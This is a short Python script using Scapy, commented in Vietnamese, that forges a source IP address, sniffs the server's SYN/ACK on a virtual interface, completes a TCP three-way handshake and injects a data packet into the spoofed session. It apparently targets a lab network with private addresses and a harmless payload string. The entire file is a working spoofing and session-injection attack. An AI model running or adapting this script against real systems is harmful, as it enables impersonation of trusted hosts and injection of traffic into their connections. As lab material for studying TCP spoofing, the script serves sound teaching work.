#!/usr/bin/env python3
# spoof_sniff.py - Gia mao IP nguon (10.0.0.77) va hoan tat bat tay TCP 3 buoc
import time
from scapy.all import *

victim = "10.0.0.2"
spoof  = "10.0.0.77"   # Dia chi IP ma (gia mao)
dport  = 9000
sport  = 12345

print(f"[*] Buoc 1: Bat may lang nghe (sniff) tren cap mang veth1 truoc...")
# Bat nghe len truoc de khong bao gio bi lo goi SYN/ACK sieu toc cua Linux
sniffer = AsyncSniffer(iface="veth1", timeout=4, count=1,
                       lfilter=lambda p: p.haslayer(TCP) and p[TCP].dport == sport
                       and (p[TCP].flags & 0x12) == 0x12)
sniffer.start()
time.sleep(0.3)   # Cho may nghe len san sang

print(f"[*] Buoc 2: Gui goi SYN tu IP gia mao ({spoof}) den Server ({victim}:{dport})...")
send(IP(src=spoof, dst=victim)/TCP(sport=sport, dport=dport, flags="S", seq=1000), verbose=0)

sniffer.join()
sa = sniffer.results

if not sa:
    print("[-] Loi: Khong bat duoc goi SYN/ACK tu server!")
    print("    -> Ban kiem tra xem ben cua so Victim (h2) Server con dang chay khong nhe!")
    exit(1)

isn = sa[0][TCP].seq
print(f"[+] Bat duoc SYN/ACK thanh cong! ISN thuc te cua server = {hex(isn)} ({isn})")

print(f"[*] Buoc 3: Gui goi ACK gia mao voi ack_number = ISN + 1 ({isn + 1}) de hoan tat bat tay 3 buoc...")
send(IP(src=spoof, dst=victim)/TCP(sport=sport, dport=dport, flags="A",
     seq=1001, ack=isn + 1), verbose=0)

print("[*] Buoc 4: Gui goi du lieu gia mao mang thong diep doc hai vao phien TCP...")
send(IP(src=spoof, dst=victim)/TCP(sport=sport, dport=dport, flags="PA",
     seq=1001, ack=isn + 1)/b"hello-from-spoofed-source-10.0.0.77\n", verbose=0)

print(f"\n[+] DA HOAN TAT! Goi tin mang du lieu gia mao {spoof} da duoc gui toi server thanh cong.")
